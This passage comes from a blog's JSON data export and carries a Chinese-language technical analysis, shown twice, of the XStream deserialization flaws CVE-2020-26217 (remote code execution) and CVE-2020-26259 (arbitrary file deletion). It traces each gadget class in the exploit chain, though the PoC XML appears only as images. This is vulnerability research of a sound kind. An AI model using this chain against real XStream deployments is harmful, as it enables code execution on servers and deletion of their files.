07a7e5b96da67628c16cc974.png](https://xzfile.aliyuncs.com/media/upload/picture/20201222102121-61805992-43fc-1.png)\n\n到此，一个任意文件删除漏洞产生了\n\n总结\n----\n\n通过对这两个漏洞的分析不难发现，CVE-2020-26259其实是CVE-2020-26217的一个思路上的延伸：在is可控时，既然baos.readFrom(is)可以利用，那么is.close()是否也能构造出一个利用链呢？从CVE-2020-26259答案上来看是可以的。\n\n从CVE-2020-26259也可以延伸出另一个问题：只要找到一个类，其中存在close方法且close方法中有可利用的地方，那么一条新的利用链就被挖掘出来了。","slug":"xstream","published":1,"updated":"2020-12-22T02:35:06.662Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckizdlr2f000034a93yuwcez8","content":"<p>XStream是一个基于Java库，可以将Java对象序列化为XML，反之亦然。</p>\n<p>2020年，Xstream有两个影响比较大的高危漏洞被爆出：CVE-2020-26217远程代码执行漏洞与CVE-2020-26259任意文件删除漏洞。纵观两个漏洞，他们出现的原因与机制上极其相似，因此我们在这里放到一块来分析。</p>\n<h2 id=\"理解poc\"><a href=\"#理解poc\" class=\"headerlink\" title=\"理解poc\"></a>理解poc</h2><p>首先把CVE-2020-26217与CVE-2020-26259的poc放到一起比较下：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101608-a711bcea-43fb-1.png\" alt=\"d34797a4ddc5b43d65081945ef66df44.png\"></p>\n<p>从上图两个漏洞poc的对比上来看：二者利用链前半部分都是一样的，只有中间is元素的class属性值不同：其中一个为java.io.SequenceInputStream而另一个为com.sun.xml.internal.ws.util.ReadAllStream$FileStream。</p>\n<p>因此，我们可以先从他们相同部分的调用链入手分析，等到了他们分歧之处，我们再分开来分析。在分析漏洞之前，我们需要搞明白poc中的元素以及其属性到底代表什么意思。</p>\n<p>由于poc是个xml格式，我们一层层来剖析这个xml。首先把poc元素折叠起来，看看entry元素中包含的元素内容，见下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101620-ae32e15c-43fb-1.png\" alt=\"83aa880b6449414c98b27ded50dc526d.png\"></p>\n<p>entry元素中包含了jdk.nashorn.internal.objects.NativeString与string两个元素</p>\n<p>上图这样的结构代表什么意思呢？又是怎么生成的呢？</p>\n<p>我们本地做了一个demo，看一下下面的例子：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101630-b43b22ee-43fb-1.png\" alt=\"892079c7fe99ee385d914598e4e71742.png\"></p>\n<p>在这个demo中，HashMap的key为一个Person对象，而value为String类型”test”</p>\n<p>Xstream将这个map输出为下图形式</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101643-bbc2848a-43fb-1.png\" alt=\"1592bbe0c1825fe08c95801dfc8b75a9.png\"></p>\n<p>让我们对比一下poc与我们测试demo</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101652-c1a4211a-43fb-1.png\" alt=\"1c790c9505e2b94baf387ec748035bb6.png\"></p>\n<p>从我们的demo与实际poc两个例子可以看出：在Xstream将Map生成xml格式数据时，会为每个Entry对象生成一个<entry>…</entry>元素，并将该Entry中的key与value作为其子元素顺次放置于其中第一个和第二个元素处。因此我们可以通过这个特点推断出，poc中jdk.nashorn.internal.objects.NativeString与string两个元素其实就是该Entry的key与value。此外，我们回头看一下我们的demo</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101701-c6e90da2-43fb-1.png\" alt=\"e7ffb7bf7da93d3b2e38634409da77e1.png\"></p>\n<p>从上图可见：在生成xml时，我们为Person对象赋值的name（“kumamon”）与age（3）属性值成为了Person对象节点(<Person>…</Person>)的子元素(<name>…</name>、<age>…</age>)</p>\n<p>因此可以推断，当一个java对象通过Xstream生成xml时，其结构应遵循如下结构：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101710-cc23fe9e-43fb-1.png\" alt=\"63ece0f9306b3ecfb8129f2c38648d7f.png\"></p>\n<p>回头看一下我们的poc，我们再展开一级看看</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101719-d17ac30a-43fb-1.png\" alt=\"16ce0ebdf3377e6df85265b6a555bd2a.png\"></p>\n<p>通过上文的理解，上图poc可以理解为一个map集合，其中存在key为jdk.nashorn.internal.objects.NativeString对象、value值为test的Entry。而jdk.nashorn.internal.objects.NativeString对象又存在flags、value属性，它的flags属性值为0、value属性值为com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</p>\n<p>在弄明白poc结构之后，我们来调试下poc的解析的过程</p>\n<p>Xstream程序在解析xml时遇到Map结构后，会新建了一个map并将xml中key-value对取出并put入其中，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101729-d75f165e-43fb-1.png\" alt=\"878db342566da34f2d1bf5456e32f6c8.png\"></p>\n<p>上图key值即为poc中Entry内key值(NativeString对象)，而values则为Entry中value（test字符串）</p>\n<p>根据map的原理可知：map在put key操作时需要获取key的hash值。因此程序调用了jdk.nashorn.internal.objects.NativeString的hashCode方法，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101739-dd3e88de-43fb-1.png\" alt=\"8b0d0e61c6ca62b242ecb1a2bd87cc4e.png\"></p>\n<p>从上图可见，程序调用了getStringValue方法，我们跟入这个方法，见下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101750-e4194d38-43fb-1.png\" alt=\"dc8c73bf3c6ab518f21357c8c8a8dc77.png\"></p>\n<p>在这个方法中，程序将判断this.value是否为String实例，并尝试调用this.value.toString方法</p>\n<p>经过上文对poc的分析，此时的this.value其实就是&lt;jdk.nashorn.internal.objects.NativeString&gt;</p>\n<p>…&lt;/jdk.nashorn.internal.objects.NativeString&gt;元素中的value子元素值，攻击者可以通过xml中NativeString元素的value子元素控制。在官方给出的poc中，将value值构造为com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data类。见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101801-ea535fe0-43fb-1.png\" alt=\"e5f9a82693002f1ff0ffdb99e397876e.png\"></p>\n<p>因此，此时this.value为com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data。程序调用Base64Data类的toString方法，见下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101809-ef7c00e4-43fb-1.png\" alt=\"76ed589f2d9e2905b6eae30f313a7c3c.png\"></p>\n<p>Base64Data类中toString方法首先调用了其自身的get方法，跟入get方法中，见下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101819-f5394f82-43fb-1.png\" alt=\"15fec8fb304d6f3b08b3c9522f726a73.png\"></p>\n<p>分析上图代码：this.dataHandler.getDataSource().getInputStream();将其拆分来看：</p>\n<blockquote>\n<ol>\n<li>首先程序执行this.dataHandler.getDataSource()，即是获取Base64Data对象中dataHandler属性的DataSource值。Base64Data的dataHandler属性值以及dataHandler的dataSource属性值都可以在xml中设置。poc中将dataSource设置为：com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource。因此this.dataHandler.getDataSource()获取的值为：com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource</li>\n<li>随后程序执行com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource类的getInputStream方法，这将获取com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSourc的is属性值</li>\n</ol>\n</blockquote>\n<p>CVE-2020-26217与CVE-2020-26259两个POC中设置的DataSource的is属性值不同，这将导致两个漏洞进入了不同的调用链。我们先来看看CVE-2020-26217</p>\n<h2 id=\"CVE-2020-26217\"><a href=\"#CVE-2020-26217\" class=\"headerlink\" title=\"CVE-2020-26217\"></a>CVE-2020-26217</h2><p>我们来看看CVE-2020-26217 的poc中DataSource元素包含的is元素是什么</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101830-fb813ee0-43fb-1.png\" alt=\"f0e4141c96e9cd4639cff3947463465e.png\"></p>\n<p>通过上图可见，poc中构造的is值为java.io.SequenceInputStream</p>\n<p>随后，程序将is变量传入readFrom方法中，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101838-0070b822-43fc-1.png\" alt=\"99aab2931c1ff9c012f521942bd90e2d.png\"></p>\n<p>readFrom方法实现如下：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101847-05a99430-43fc-1.png\" alt=\"1fc784e3f0a2fbd3f330ae0f250e764f.png\"></p>\n<p>此时的is变量为java.io.SequenceInputStream，随后程序调用java.io.SequenceInputStream类的read方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101856-0b809b1a-43fc-1.png\" alt=\"d2a5d9c57242dd3eacac8b70d049d71c.png\"></p>\n<p>从上图可见，程序将调用java.io.SequenceInputStream类的read方法中的nextStream方法，跟入nextStream方法中，见下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101905-1083bc6e-43fc-1.png\" alt=\"6e18d9427d989ff5bc74288c7672f010.png\"></p>\n<p>从上图110行可见，程序将执行in = (InputStream) e.nextElement();</p>\n<p>而e的值，可以通过向xml中SequenceInputStream元素中的e元素值来控制。在poc中将这个e元素值设置为javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101914-15eab5ae-43fc-1.png\" alt=\"5e8d4f1fbc9a61ff3f8d87925ce059dd.png\"></p>\n<p>因此，程序事实上调用的是javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator的nextElement方法。接下来进入位于javax/swing/MultiUIDefaults.java中的nextElement方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101922-1ad15c12-43fc-1.png\" alt=\"36179f060686fbd3c4e63d02319bc5f9.png\"></p>\n<p>可见，这次需要执行的是iterator.next().getKey();</p>\n<p>我们需要为javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator对象构造一个满足要求的iterator属性值。通过分析poc可知，poc中选取了javax.imageio.spi.FilterIterator作为iterator属性值，见下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101931-201c4290-43fc-1.png\" alt=\"7493c31ccbe9e06095ec1152db984aad.png\"></p>\n<p>跟入位于javax/imageio/spi/ServiceRegistry.java的javax.imageio.spi.FilterIterator类的next方法，见下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101940-253c5184-43fc-1.png\" alt=\"a384d286798cd42d1731cee9d4d1e527.png\"></p>\n<p>在javax.imageio.spi.FilterIterator类的next方法中，执行advance方法。跟入advance方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101948-2a59a82e-43fc-1.png\" alt=\"44a02b99fd6415ef9166f1ed0cdcb0b6.png\"></p>\n<p>从上图可见，程序执行了T elt = iter.next();<br>此时的iter显然可以通过xml中javax.imageio.spi.FilterIterator元素中iter元素控制，我们看一下poc中构造的iter子节点，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101958-300a5098-43fc-1.png\" alt=\"93ba1f00ebcb9d2f282000f71a151bf7.png\"></p>\n<p>当iter.next()执行后，poc中构造的java.lang.ProcessBuilder被返回并赋值给elt，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222102006-34f78a58-43fc-1.png\" alt=\"30bf493a1edab443e8344fa49477501b.png\"></p>\n<p>随后，程序执行filter.filter(elt)</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222102015-3a6dfd32-43fc-1.png\" alt=\"b9fbc07f738628acd033293b75e4a4fb.png\"></p>\n<p>很显然，filter值是可以通过xml中javax.imageio.spi.FilterIterator元素中filter元素控制的。看一下poc</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222102025-404882b8-43fc-1.png\" alt=\"2399d10456b0b8ca2b80530558fd6638.png\"></p>\n<p>Filter赋值为javax.imageio.ImageIO$ContainsFilter类</p>\n<p>我们跟入javax.imageio.ImageIO$ContainsFilter类的filter方法中，位于javax/imageio/ImageIO.java</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222102034-456e0808-43fc-1.png\" alt=\"07cb916ddd1ecccab1826e6d02e2332a.png\"></p>\n<p>可见在javax.imageio.ImageIO$ContainsFilter类的filter方法中，执行了method.invoke(elt)。method可以通过xml中javax.imageio.ImageIO$ContainsFilter元素包含的method元素控制，见poc</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222102043-4ad23f94-43fc-1.png\" alt=\"3b7db9c50a524053543af100954a2725.png\"></p>\n<p>此时method为ProcessBuilder类的start方法，而通过上文可知：elt为构造好的java.lang.ProcessBuilder对象。在method与elt都可控的情况下，进行反射调用即可实现远程代码执行利用。</p>\n<p>我们接下来看看CVE-2020-26259任意文件删除漏洞</p>\n<h2 id=\"CVE-2020-26259\"><a href=\"#CVE-2020-26259\" class=\"headerlink\" title=\"CVE-2020-26259\"></a>CVE-2020-26259</h2><p>首先分析下CVE-2020-26259的poc</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222102054-516f3942-43fc-1.png\" alt=\"9487c50fd32f234881fa16a9ce39323f.png\"></p>\n<p>从poc中可以发现：CVE-2020-26259的poc中is元素为com.sun.xml.internal.ws.util.ReadAllStream$FileStream，这与上一个漏洞poc不一样。</p>\n<p>值得注意的是，这次漏洞利用的不是Base64Data中get方法里的baos.readFrom(is)这个入口，而是位于它下面一行的is.close()这行代码。通过调试，程序在执行过get方法中baos.readFrom(is)后，紧接着执行is.Close()，见下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222102102-56a91cca-43fc-1.png\" alt=\"c40109bfe416f80101dd1aa35c11b9c4.png\"></p>\n<p>此时的is是com.sun.xml.internal.ws.util.ReadAllStream$FileStream，跟入com.sun.xml.internal.ws.util.ReadAllStream$FileStream中的close方法，见下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222102111-5c093aec-43fc-1.png\" alt=\"d783f17d2981353ed8d3e6b5d0375d6c.png\"></p>\n<p>当com.sun.xml.internal.ws.util.ReadAllStream$FileStream对象的tempFile属性值不为空时，删除tempFile文件。</p>\n<p>tempFile是com.sun.xml.internal.ws.util.ReadAllStream$FileStream对象的属性值，因此可以直接在poc中com.sun.xml.internal.ws.util.ReadAllStream$FileStream元素内构造tempFile属性元素，通过tempFile属性元素控制要删除的文件，见下图poc</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222102121-61805992-43fc-1.png\" alt=\"53b7006a07a7e5b96da67628c16cc974.png\"></p>\n<p>到此，一个任意文件删除漏洞产生了</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>通过对这两个漏洞的分析不难发现，CVE-2020-26259其实是CVE-2020-26217的一个思路上的延伸：在is可控时，既然baos.readFrom(is)可以利用，那么is.close()是否也能构造出一个利用链呢？从CVE-2020-26259答案上来看是可以的。</p>\n<p>从CVE-2020-26259也可以延伸出另一个问题：只要找到一个类，其中存在close方法且close方法中有可利用的地方，那么一条新的利用链就被挖掘出来了。</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"","more":"<p>XStream是一个基于Java库，可以将Java对象序列化为XML，反之亦然。</p>\n<p>2020年，Xstream有两个影响比较大的高危漏洞被爆出：CVE-2020-26217远程代码执行漏洞与CVE-2020-26259任意文件删除漏洞。纵观两个漏洞，他们出现的原因与机制上极其相似，因此我们在这里放到一块来分析。</p>\n<h2 id=\"理解poc\"><a href=\"#理解poc\" class=\"headerlink\" title=\"理解poc\"></a>理解poc</h2><p>首先把CVE-2020-26217与CVE-2020-26259的poc放到一起比较下：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101608-a711bcea-43fb-1.png\" alt=\"d34797a4ddc5b43d65081945ef66df44.png\"></p>\n<p>从上图两个漏洞poc的对比上来看：二者利用链前半部分都是一样的，只有中间is元素的class属性值不同：其中一个为java.io.SequenceInputStream而另一个为com.sun.xml.internal.ws.util.ReadAllStream$FileStream。</p>\n<p>因此，我们可以先从他们相同部分的调用链入手分析，等到了他们分歧之处，我们再分开来分析。在分析漏洞之前，我们需要搞明白poc中的元素以及其属性到底代表什么意思。</p>\n<p>由于poc是个xml格式，我们一层层来剖析这个xml。首先把poc元素折叠起来，看看entry元素中包含的元素内容，见下图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101620-ae32e15c-43fb-1.png\" alt=\"83aa880b6449414c98b27ded50dc526d.png\"></p>\n<p>entry元素中包含了jdk.nashorn.internal.objects.NativeString与string两个元素</p>\n<p>上图这样的结构代表什么意思呢？又是怎么生成的呢？</p>\n<p>我们本地做了一个demo，看一下下面的例子：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101630-b43b22ee-43fb-1.png\" alt=\"892079c7fe99ee385d914598e4e71742.png\"></p>\n<p>在这个demo中，HashMap的key为一个Person对象，而value为String类型”test”</p>\n<p>Xstream将这个map输出为下图形式</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101643-bbc2848a-43fb-1.png\" alt=\"1592bbe0c1825fe08c95801dfc8b75a9.png\"></p>\n<p>让我们对比一下poc与我们测试demo</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101652-c1a4211a-43fb-1.png\" alt=\"1c790c9505e2b94baf387ec748035bb6.png\"></p>\n<p>从我们的demo与实际poc两个例子可以看出：在Xstream将Map生成xml格式数据时，会为每个Entry对象生成一个<entry>…</entry>元素，并将该Entry中的key与value作为其子元素顺次放置于其中第一个和第二个元素处。因此我们可以通过这个特点推断出，poc中jdk.nashorn.internal.objects.NativeString与string两个元素其实就是该Entry的key与value。此外，我们回头看一下我们的demo</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101701-c6e90da2-43fb-1.png\" alt=\"e7ffb7bf7da93d3b2e38634409da77e1.png\"></p>\n<p>从上图可见：在生成xml时，我们为Person对象赋值的name（“kumamon”）与age（3）属性值成为了Person对象节点(<Person>…</Person>)的子元素(<name>…</name>、<age>…</age>)</p>\n<p>因此可以推断，当一个java对象通过Xstream生成xml时，其结构应遵循如下结构：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101710-cc23fe9e-43fb-1.png\" alt=\"63ece0f9306b3ecfb8129f2c38648d7f.png\"></p>\n<p>回头看一下我们的poc，我们再展开一级看看</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101719-d17ac30a-43fb-1.png\" alt=\"16ce0ebdf3377e6df85265b6a555bd2a.png\"></p>\n<p>通过上文的理解，上图poc可以理解为一个map集合，其中存在key为jdk.nashorn.internal.objects.NativeString对象、value值为test的Entry。而jdk.nashorn.internal.objects.NativeString对象又存在flags、value属性，它的flags属性值为0、value属性值为com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</p>\n<p>在弄明白poc结构之后，我们来调试下poc的解析的过程</p>\n<p>Xstream程序在解析xml时遇到Map结构后，会新建了一个map并将xml中key-value对取出并put入其中，见下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101729-d75f165e-43fb-1.png\" alt=\"878db342566da34f2d1bf5456e32f6c8.png\"></p>\n<p>上图key值即为poc中Entry内key值(NativeString对象)，而values则为Entry中value（test字符串）</p>\n<p>根据map的原理可知：map在put key操作时需要获取key的hash值。因此程序调用了jdk.nashorn.internal.objects.NativeString的hashCode方法，见下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101739-dd3e88de-43fb-1.png\" alt=\"8b0d0e61c6ca62b242ecb1a2bd87cc4e.png\"></p>\n<p>从上图可见，程序调用了getStringValue方法，我们跟入这个方法，见下图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101750-e4194d38-43fb-1.png\" alt=\"dc8c73bf3c6ab518f21357c8c8a8dc77.png\"></p>\n<p>在这个方法中，程序将判断this.value是否为String实例，并尝试调用this.value.toString方法</p>\n<p>经过上文对poc的分析，此时的this.value其实就是&lt;jdk.nashorn.internal.objects.NativeString&gt;</p>\n<p>…&lt;/jdk.nashorn.internal.objects.NativeString&gt;元素中的value子元素值，攻击者可以通过xml中NativeString元素的value子元素控制。在官方给出的poc中，将value值构造为com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data类。见下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101801-ea535fe0-43fb-1.png\" alt=\"e5f9a82693002f1ff0ffdb99e397876e.png\"></p>\n<p>因此，此时this.value为com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data。程序调用Base64Data类的toString方法，见下图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101809-ef7c00e4-43fb-1.png\" alt=\"76ed589f2d9e2905b6eae30f313a7c3c.png\"></p>\n<p>Base64Data类中toString方法首先调用了其自身的get方法，跟入get方法中，见下图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101819-f5394f82-43fb-1.png\" alt=\"15fec8fb304d6f3b08b3c9522f726a73.png\"></p>\n<p>分析上图代码：this.dataHandler.getDataSource().getInputStream();将其拆分来看：</p>\n<blockquote>\n<ol>\n<li>首先程序执行this.dataHandler.getDataSource()，即是获取Base64Data对象中dataHandler属性的DataSource值。Base64Data的dataHandler属性值以及dataHandler的dataSource属性值都可以在xml中设置。poc中将dataSource设置为：com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource。因此this.dataHandler.getDataSource()获取的值为：com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource</li>\n<li>随后程序执行com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource类的getInputStream方法，这将获取com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSourc的is属性值</li>\n</ol>\n</blockquote>\n<p>CVE-2020-26217与CVE-2020-26259两个POC中设置的DataSource的is属性值不同，这将导致两个漏洞进入了不同的调用链。我们先来看看CVE-2020-26217</p>\n<h2 id=\"CVE-2020-26217\"><a href=\"#CVE-2020-26217\" class=\"headerlink\" title=\"CVE-2020-26217\"></a>CVE-2020-26217</h2><p>我们来看看CVE-2020-26217 的poc中DataSource元素包含的is元素是什么</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101830-fb813ee0-43fb-1.png\" alt=\"f0e4141c96e9cd4639cff3947463465e.png\"></p>\n<p>通过上图可见，poc中构造的is值为java.io.SequenceInputStream</p>\n<p>随后，程序将is变量传入readFrom方法中，见下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101838-0070b822-43fc-1.png\" alt=\"99aab2931c1ff9c012f521942bd90e2d.png\"></p>\n<p>readFrom方法实现如下：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101847-05a99430-43fc-1.png\" alt=\"1fc784e3f0a2fbd3f330ae0f250e764f.png\"></p>\n<p>此时的is变量为java.io.SequenceInputStream，随后程序调用java.io.SequenceInputStream类的read方法</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101856-0b809b1a-43fc-1.png\" alt=\"d2a5d9c57242dd3eacac8b70d049d71c.png\"></p>\n<p>从上图可见，程序将调用java.io.SequenceInputStream类的read方法中的nextStream方法，跟入nextStream方法中，见下图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101905-1083bc6e-43fc-1.png\" alt=\"6e18d9427d989ff5bc74288c7672f010.png\"></p>\n<p>从上图110行可见，程序将执行in = (InputStream) e.nextElement();</p>\n<p>而e的值，可以通过向xml中SequenceInputStream元素中的e元素值来控制。在poc中将这个e元素值设置为javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator，见下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101914-15eab5ae-43fc-1.png\" alt=\"5e8d4f1fbc9a61ff3f8d87925ce059dd.png\"></p>\n<p>因此，程序事实上调用的是javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator的nextElement方法。接下来进入位于javax/swing/MultiUIDefaults.java中的nextElement方法</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101922-1ad15c12-43fc-1.png\" alt=\"36179f060686fbd3c4e63d02319bc5f9.png\"></p>\n<p>可见，这次需要执行的是iterator.next().getKey();</p>\n<p>我们需要为javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator对象构造一个满足要求的iterator属性值。通过分析poc可知，poc中选取了javax.imageio.spi.FilterIterator作为iterator属性值，见下图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101931-201c4290-43fc-1.png\" alt=\"7493c31ccbe9e06095ec1152db984aad.png\"></p>\n<p>跟入位于javax/imageio/spi/ServiceRegistry.java的javax.imageio.spi.FilterIterator类的next方法，见下图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101940-253c5184-43fc-1.png\" alt=\"a384d286798cd42d1731cee9d4d1e527.png\"></p>\n<p>在javax.imageio.spi.FilterIterator类的next方法中，执行advance方法。跟入advance方法</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101948-2a59a82e-43fc-1.png\" alt=\"44a02b99fd6415ef9166f1ed0cdcb0b6.png\"></p>\n<p>从上图可见，程序执行了T elt = iter.next();<br>此时的iter显然可以通过xml中javax.imageio.spi.FilterIterator元素中iter元素控制，我们看一下poc中构造的iter子节点，见下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222101958-300a5098-43fc-1.png\" alt=\"93ba1f00ebcb9d2f282000f71a151bf7.png\"></p>\n<p>当iter.next()执行后，poc中构造的java.lang.ProcessBuilder被返回并赋值给elt，见下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222102006-34f78a58-43fc-1.png\" alt=\"30bf493a1edab443e8344fa49477501b.png\"></p>\n<p>随后，程序执行filter.filter(elt)</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222102015-3a6dfd32-43fc-1.png\" alt=\"b9fbc07f738628acd033293b75e4a4fb.png\"></p>\n<p>很显然，filter值是可以通过xml中javax.imageio.spi.FilterIterator元素中filter元素控制的。看一下poc</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222102025-404882b8-43fc-1.png\" alt=\"2399d10456b0b8ca2b80530558fd6638.png\"></p>\n<p>Filter赋值为javax.imageio.ImageIO$ContainsFilter类</p>\n<p>我们跟入javax.imageio.ImageIO$ContainsFilter类的filter方法中，位于javax/imageio/ImageIO.java</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222102034-456e0808-43fc-1.png\" 